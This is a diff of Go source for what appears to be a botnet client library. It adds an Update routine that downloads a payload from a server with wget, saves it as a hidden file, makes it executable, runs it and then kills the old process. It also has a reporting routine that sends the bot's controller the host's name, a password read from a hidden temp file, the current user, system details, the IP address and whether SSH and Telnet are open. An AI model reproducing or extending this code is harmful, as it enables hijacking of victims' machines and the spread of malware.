@@ -2,19 +2,30 @@ package lib
 
 import (
 	"fmt"
+	"math/rand"
 	"os"
 	"os/exec"
-	"runtime"
 	"strconv"
+	"strings"
+	"syscall"
+	"time"
 
 	"golang.org/x/sys/unix"
 )
 
-func printPort(port string) string {
-	if checkPort("127.0.0.1:"+port) != "" {
-		return "OPEN"
-	}
-	return "CLOSE"
+func Kill() { syscall.Exit(0) }
+
+func genName(alphabet rune) string {
+	return string(alphabet + rune(rand.Intn(26)))
+}
+
+func CutWord(word, cut string) string {
+	return strings.Trim(word, cut)
+}
+
+func convInt(str string) int {
+	conv, _ := strconv.Atoi(fmt.Sprint(str))
+	return conv
 }
 
 func getHostname() string {
@@ -26,11 +37,11 @@ func getHostname() string {
 }
 
 func execComd(comd string, args ...string) string {
-	pComd, err := exec.Command(comd, args...).Output()
+	fmtComd, err := exec.Command(comd, args...).Output()
 	if err != nil {
 		return "🗑 Failed to execute command!!!"
 	}
-	return string(pComd)
+	return string(fmtComd)
 }
 
 func getDiskSpace() string {
@@ -43,20 +54,37 @@ func getDiskSpace() string {
 	return fmt.Sprint(stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024)
 }
 
-func (b *Bot) threadsNumber() string {
+func (b *Bot) Update(setPayload, server string) {
+	defer Kill()
+	b.Report("🖥 START UPDATING...")
+	newPayload := "." + setPayload
+	execComd("wget", "-O", newPayload, server)
+	execComd("chmod", "700", newPayload)
+	go execComd("./"+newPayload, "&")
+	time.Sleep(10 * time.Second) //wait for bot to join the server.
+}
+
+func (b Bot) printPort(port string) string {
+	b.timeout = 300 * time.Millisecond
+	if b.checkPort("127.0.0.1:"+port) != "" {
+		return "OPEN"
+	}
+	return "CLOSE"
+}
+
+func (b Bot) threadsNumber() string {
 	return strconv.Itoa(b.CPU * 2)
 }
 
-func (b *Bot) ReportInfo() {
-	b.CPU = runtime.NumCPU()
+func (b *Bot) Information() {
 	b.Report("Host Name: " + getHostname())
 	b.Report("Password: " + execComd("head", "-1", "/tmp/.ffff"))
 	b.Report("Current Permission: " + execComd("whoami"))
 	b.Report("System: " + execComd("uname", "-a"))
 	b.Report("Free Disk Space (GB): " + getDiskSpace())
-	b.Report("Number of CPUs: " + strconv.Itoa(b.CPU))
+	b.Report("Number of Cores: " + strconv.Itoa(b.CPU))
 	b.Report("Number of Threads: " + b.threadsNumber())
 	b.Report("IP Address: " + execComd("tail", "-1", "/tmp/.ffff"))
-	b.Report("Default SSH: " + printPort("22"))
-	b.Report("Default Telnet: " + printPort("23"))
+	b.Report("Default SSH: " + b.printPort("22"))
+	b.Report("Default Telnet: " + b.printPort("23"))
 }
